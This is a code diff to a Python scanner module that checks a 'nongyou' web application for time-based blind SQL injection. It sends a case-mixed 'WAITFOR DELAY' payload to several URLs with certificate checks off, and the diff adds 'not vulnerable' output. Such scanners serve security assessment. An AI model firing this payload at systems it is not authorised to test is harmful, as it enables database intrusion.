@@ -28,14 +28,18 @@ class nongyou_sleep_sqli_BaseVerify:
         payload = ";WaItFoR%20DeLaY%20%270:0:6%27--"
         start_time = time.time()
         try:
+            noexist = True
             for turl in urls:
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if time.time() - start_time >= 6:
                     cprint("[+]存在农友多处时间盲注漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在nongyou_sleep_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
